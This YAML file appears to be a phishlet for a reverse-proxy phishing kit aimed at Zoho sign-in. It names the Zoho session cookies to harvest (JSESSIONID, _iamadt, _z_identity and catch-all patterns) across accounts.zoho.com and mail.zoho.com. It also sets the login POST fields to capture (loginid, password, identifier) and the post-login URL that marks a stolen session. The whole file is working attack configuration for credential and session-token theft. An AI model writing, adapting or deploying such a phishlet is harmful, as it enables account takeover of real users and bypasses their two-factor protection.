auth_tokens:
  - domain: '.zoho.com'
    keys: ['.*,regexp']
  - domain: 'accounts.zoho.com'
    keys: ['zps-tgr-dts', 'zpsfa_sixYsSO', 'zohocares-_zldp', 'zohocares-_uuid', 'IAMSATCK_728151783', 'e188bc05fe', 'iamcsr', '_zcsr_tmp', 'JSESSIONID', 'stk', '_iamadt', '_iambdt', '_z_identity', '.*,regexp']
  - domain: 'mail.zoho.com'
    keys: ['.*,regexp']    
credentials:
  username:
    key: 'loginid'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'loginid'
      search: '(.*)'
      type: 'post'
    - key: 'identifier'
      search: '([0-9]*)'
      type: 'post'
auth_urls:
  - '/home'
login:
  domain: 'accounts.zoho.com'
  path: '/signin'